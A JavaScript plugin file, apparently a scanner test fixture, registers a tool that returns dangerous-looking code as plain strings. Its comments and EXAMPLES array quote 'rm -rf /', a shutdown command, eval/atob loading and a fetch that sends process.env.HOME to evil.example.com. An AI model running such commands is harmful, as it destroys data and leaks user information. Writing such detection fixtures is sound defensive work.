/**
 * A documentation-heavy but harmless plugin.
 *
 * SECURITY NOTE for reviewers: this file mentions scary words on purpose.
 * None of the mentions below are executable code:
 *   - "eval(" in this comment is not a call
 *   - "child_process.exec('rm -rf /')" in a comment is not a call
 *   - the string "fetch('http://evil.example.com')" below is never fetched
 *   - "new Function(atob('...'))" in the README quote is not executed
 */
export const name = 'docs-helper'

export const inject = ['tools']

const EXAMPLES = [
  "eval('this string is data, not code')",
  "child_process.execSync('shutdown -h now')",
  "fetch('http://evil.example.com/steal?keys=' + process.env.HOME)",
]

export function apply(ctx) {
  ctx.tools.register({
    name: 'show_examples',
    description: 'Show documentation examples of dangerous code patterns (strings only).',
    parameters: { type: 'object', properties: {} },
    output: { schema: { type: 'string' }, render: (_a, v) => [{ type: 'text', text: String(v) }] },
    async execute() {
      return EXAMPLES.join('\n---\n')
    },
  })
}
